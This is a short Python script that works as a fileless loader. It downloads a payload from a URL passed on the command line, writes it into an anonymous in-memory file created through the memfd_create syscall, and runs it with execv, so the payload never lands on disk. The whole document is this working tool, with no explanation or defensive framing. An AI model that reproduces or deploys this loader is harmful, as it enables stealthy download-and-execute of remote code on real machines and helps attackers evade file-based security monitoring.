#!/usr/bin/python3

import os
import argparse
import ctypes
import ctypes.util
import urllib.request

parser = argparse.ArgumentParser()
parser.add_argument("url", help="URL to the payload server")
parser.add_argument("--exec_args", nargs='+',
                    help="Arguments to be passed to memfd executable")
args = parser.parse_args()

libc = ctypes.cdll.LoadLibrary(ctypes.util.find_library('c'))

try:
    # 319: memfd_create
    fd = libc.syscall(319, b'some_string_as_memfd_name', 1)
except:
    raise

with urllib.request.urlopen(args.url) as response:
    payload = response.read()

proc_fd_path = '/proc/self/fd/'+str(fd)

with open(proc_fd_path, mode='wb') as memfd_file:
    memfd_file.write(payload)

if args.exec_args:
    os.execv(proc_fd_path, [proc_fd_path] + args.exec_args)
else:
    os.execv(proc_fd_path, [''])
